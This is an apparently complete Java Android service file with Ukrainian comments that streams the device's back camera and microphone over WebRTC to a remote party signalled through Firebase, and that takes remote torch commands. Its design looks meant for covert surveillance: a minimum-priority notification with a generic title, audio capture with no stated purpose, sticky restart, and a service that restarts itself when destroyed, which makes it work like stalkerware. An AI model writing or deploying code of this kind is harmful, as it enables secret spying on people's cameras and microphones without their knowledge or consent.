package com.pixel.camera;

import android.app.*;
import android.content.Intent;
import android.hardware.camera2.CameraManager;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import org.webrtc.*;

import java.util.ArrayList;
import java.util.List;

public class CameraStreamService extends Service {

    private static final String TAG = "CameraStreamService";
    private static final String CHANNEL_ID = "camera_channel";

    private PeerConnectionFactory peerConnectionFactory;
    private PeerConnection peerConnection;
    private VideoSource videoSource;
    private AudioSource audioSource;
    private EglBase eglBase;
    private CameraVideoCapturer videoCapturer;
    private CameraManager cameraManager;
    private String cameraId;
    private boolean torchOn = false;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(2, buildNotification());

        try {
            cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
            cameraId = cameraManager.getCameraIdList()[0];
        } catch (Exception e) {
            Log.e(TAG, "Camera init error: " + e.getMessage());
        }

        initWebRTC();
        listenForCommands();
    }

    private void initWebRTC() {
        try {
            eglBase = EglBase.create();
            PeerConnectionFactory.InitializationOptions options =
                PeerConnectionFactory.InitializationOptions.builder(this)
                    .createInitializationOptions();
            PeerConnectionFactory.initialize(options);

            PeerConnectionFactory.Options factoryOptions = new PeerConnectionFactory.Options();
            peerConnectionFactory = PeerConnectionFactory.builder()
                .setOptions(factoryOptions)
                .setVideoEncoderFactory(new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true))
                .setVideoDecoderFactory(new DefaultVideoDecoderFactory(eglBase.getEglBaseContext()))
                .createPeerConnectionFactory();

            // Відео
            videoCapturer = createCameraCapturer();
            if (videoCapturer != null) {
                SurfaceTextureHelper surfaceHelper = SurfaceTextureHelper.create("CaptureThread", eglBase.getEglBaseContext());
                videoSource = peerConnectionFactory.createVideoSource(false);
                videoCapturer.initialize(surfaceHelper, this, videoSource.getCapturerObserver());
                videoCapturer.startCapture(640, 480, 15);
            }

            // Аудіо
            audioSource = peerConnectionFactory.createAudioSource(new MediaConstraints());

            // Зберегти стан готовності
            FirebaseDatabase.getInstance().getReference("status").setValue("ready");

        } catch (Exception e) {
            Log.e(TAG, "WebRTC init error: " + e.getMessage());
        }
    }

    private CameraVideoCapturer createCameraCapturer() {
        Camera2Enumerator enumerator = new Camera2Enumerator(this);
        for (String name : enumerator.getDeviceNames()) {
            if (enumerator.isBackFacing(name)) {
                return enumerator.createCapturer(name, null);
            }
        }
        return null;
    }

    private void listenForCommands() {
        FirebaseDatabase.getInstance().getReference("command")
            .addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(DataSnapshot snapshot) {
                    String command = snapshot.getValue(String.class);
                    if (command == null) return;
                    handleCommand(command);
                    // Очистити команду після виконання
                    FirebaseDatabase.getInstance().getReference("command").setValue(null);
                }

                @Override
                public void onCancelled(DatabaseError error) {}
            });

        // Слухати запити на з'єднання WebRTC
        FirebaseDatabase.getInstance().getReference("offer")
            .addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(DataSnapshot snapshot) {
                    String offerSdp = snapshot.getValue(String.class);
                    if (offerSdp != null) {
                        handleOffer(offerSdp);
                    }
                }

                @Override
                public void onCancelled(DatabaseError error) {}
            });
    }

    private void handleCommand(String command) {
        try {
            if ("torch_on".equals(command)) {
                cameraManager.setTorchMode(cameraId, true);
                torchOn = true;
            } else if ("torch_off".equals(command)) {
                cameraManager.setTorchMode(cameraId, false);
                torchOn = false;
            }
        } catch (Exception e) {
            Log.e(TAG, "Command error: " + e.getMessage());
        }
    }

    private void handleOffer(String offerSdp) {
        try {
            List<PeerConnection.IceServer> iceServers = new ArrayList<>();
            iceServers.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());

            PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(iceServers);

            peerConnection = peerConnectionFactory.createPeerConnection(config, new PeerConnection.Observer() {
                @Override public void onIceCandidate(IceCandidate candidate) {
                    FirebaseDatabase.getInstance().getReference("candidate_device")
                        .setValue(candidate.sdp + "||" + candidate.sdpMid + "||" + candidate.sdpMLineIndex);
                }
                @Override public void onSignalingChange(PeerConnection.SignalingState s) {}
                @Override public void onIceConnectionChange(PeerConnection.IceConnectionState s) {}
                @Override public void onIceConnectionReceivingChange(boolean b) {}
                @Override public void onIceGatheringChange(PeerConnection.IceGatheringState s) {}
                @Override public void onIceCandidatesRemoved(IceCandidate[] c) {}
                @Override public void onAddStream(MediaStream s) {}
                @Override public void onRemoveStream(MediaStream s) {}
                @Override public void onDataChannel(DataChannel d) {}
                @Override public void onRenegotiationNeeded() {}
                @Override public void onAddTrack(RtpReceiver r, MediaStream[] s) {}
            });

            // Додати треки
            if (videoSource != null) {
                VideoTrack videoTrack = peerConnectionFactory.createVideoTrack("video0", videoSource);
                peerConnection.addTrack(videoTrack);
            }
            if (audioSource != null) {
                AudioTrack audioTrack = peerConnectionFactory.createAudioTrack("audio0", audioSource);
                peerConnection.addTrack(audioTrack);
            }

            // Встановити remote offer
            SessionDescription offer = new SessionDescription(SessionDescription.Type.OFFER, offerSdp);
            peerConnection.setRemoteDescription(new SdpObserver() {
                @Override public void onCreateSuccess(SessionDescription s) {}
                @Override public void onSetSuccess() { createAnswer(); }
                @Override public void onCreateFailure(String s) {}
                @Override public void onSetFailure(String s) {}
            }, offer);

        } catch (Exception e) {
            Log.e(TAG, "Offer error: " + e.getMessage());
        }
    }

    private void createAnswer() {
        MediaConstraints constraints = new MediaConstraints();
        peerConnection.createAnswer(new SdpObserver() {
            @Override public void onCreateSuccess(SessionDescription sdp) {
                peerConnection.setLocalDescription(new SdpObserver() {
                    @Override public void onCreateSuccess(SessionDescription s) {}
                    @Override public void onSetSuccess() {
                        FirebaseDatabase.getInstance().getReference("answer").setValue(sdp.description);
                    }
                    @Override public void onCreateFailure(String s) {}
                    @Override public void onSetFailure(String s) {}
                }, sdp);
            }
            @Override public void onSetSuccess() {}
            @Override public void onCreateFailure(String s) { Log.e(TAG, "Answer error: " + s); }
            @Override public void onSetFailure(String s) {}
        }, constraints);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        try {
            if (videoCapturer != null) videoCapturer.stopCapture();
            if (peerConnection != null) peerConnection.close();
            FirebaseDatabase.getInstance().getReference("status").setValue("offline");
        } catch (Exception e) {
            e.printStackTrace();
        }
        // Перезапуск
        startForegroundService(new Intent(this, CameraStreamService.class));
    }

    private void createNotificationChannel() {
        NotificationChannel channel = new NotificationChannel(
            CHANNEL_ID, "Camera Service", NotificationManager.IMPORTANCE_MIN);
        getSystemService(NotificationManager.class).createNotificationChannel(channel);
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Camera Service")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
